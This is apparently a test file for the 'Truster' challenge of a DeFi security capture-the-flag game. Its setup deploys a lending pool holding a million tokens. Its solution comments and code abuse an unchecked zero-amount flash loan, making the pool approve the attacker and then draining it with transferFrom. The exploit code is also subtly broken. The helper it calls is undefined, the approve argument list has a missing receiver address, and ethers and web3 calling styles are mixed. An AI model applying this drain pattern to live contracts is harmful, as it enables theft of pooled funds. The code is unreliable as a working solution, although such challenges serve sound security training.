const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        /* solution: flash loan function not checking
        1. if borrow amount is 0,
        2. borrower or target address
        3. executing an external call to target address passing arbitrary data payload
        send call with 0, include data in call to approve my contract to be spender.
        then transfer from pool to attacker contract.
        */

        let data = encodeFunctionSignature({
            name: 'approve',
            type: 'function',
            inputs: [{
                type: 'address',
                name: 'receiver'
            },{
                type: 'uint256',
                name: 'amount'
            }]
        }, [, TOKENS_IN_POOL.toString()]);
        await this.pool.flashLoan(0, attacker, this.token.address, data, { from: attacker });
        await this.token.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL, { from: attacker });
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

